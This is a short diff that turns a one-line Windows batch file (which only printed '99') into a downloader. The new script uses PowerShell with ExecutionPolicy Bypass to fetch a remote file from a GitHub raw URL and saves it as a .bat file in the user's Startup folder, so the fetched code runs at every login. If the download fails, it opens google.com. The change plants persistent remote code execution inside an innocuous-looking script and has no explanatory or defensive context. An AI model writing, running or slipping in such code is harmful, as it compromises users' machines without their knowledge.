@@ -1,2 +1,19 @@
 @echo off
-echo 99
+setlocal
+
+set "URL=https://raw.githubusercontent.com/animationss253/magarni/main/run.txt"
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "DEST=%STARTUP%\iys.bat"
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"try { Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%' -UseBasicParsing -TimeoutSec 15; Write-Host 'Download successful.'; exit 0 } catch { Write-Host 'Download failed.'; exit 1 }"
+
+if errorlevel 1 (
+    echo Download failed. Opening Google...
+    start "" "https://google.com"
+) else (
+    echo Saved to Startup successfully.
+)
+
+pause
+endlocal
